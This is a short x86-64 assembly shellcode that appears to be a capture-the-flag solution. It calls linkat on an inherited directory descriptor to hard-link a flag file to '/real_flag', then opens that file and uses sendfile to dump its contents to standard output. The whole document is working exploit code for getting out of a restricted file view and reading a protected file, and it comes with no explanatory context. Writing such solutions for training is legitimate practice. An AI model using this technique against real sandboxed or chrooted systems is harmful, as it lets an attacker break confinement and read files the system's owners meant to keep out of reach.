.global _start
_start:
.intel_syntax noprefix

# linkat(3, "./flag", 3, "/real_flag", 0);
mov rax, 265
mov rdi, 3
lea rsi, [rip+flag]
mov rdx, 3
lea r10, [rip+realflag]
mov r8, 0
syscall

# open("/real_flag", 0); // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+realflag]
mov rsi, 0
syscall

# sendfile(1, 4, 0, 0x80);
mov rdi, 1
mov rsi, 4
mov rdx, 0
mov r10, 0x80
mov rax, 40
syscall

flag:
.asciz "./flag"
realflag:
.asciz "/real_flag"
